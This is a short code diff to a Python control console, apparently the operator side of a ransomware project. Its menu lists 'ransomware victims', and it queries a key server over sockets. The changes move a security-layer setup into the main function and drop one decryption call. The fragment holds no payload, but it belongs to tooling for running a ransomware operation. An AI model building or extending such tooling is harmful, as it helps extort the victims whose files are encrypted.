@@ -11,11 +11,13 @@ import socket
 from utile import security
 import utile.configgetter as config
 
-sec = security.SecurityLayer()
-
 def main():
     """ Console de contrôle """
     # Key server start
+
+    # Initialisation de la sécurité
+    sec = security.SecurityLayer();
+
     print('CONSOLE DE CONTRÔLE'
           '\n==================='
           '\n1) Liste des victimes du ransomware'
@@ -37,7 +39,6 @@ def main():
             s.send(bytes("1", 'utf-8'))
             # On récupère la réponse en écoutant
             data = s.recv(2048)
-            data = sec.decrypt(data)
             # Et on l'envoie...
             print('Réception de données de la part du serveur : ' + str(data))
         elif choix == '2':
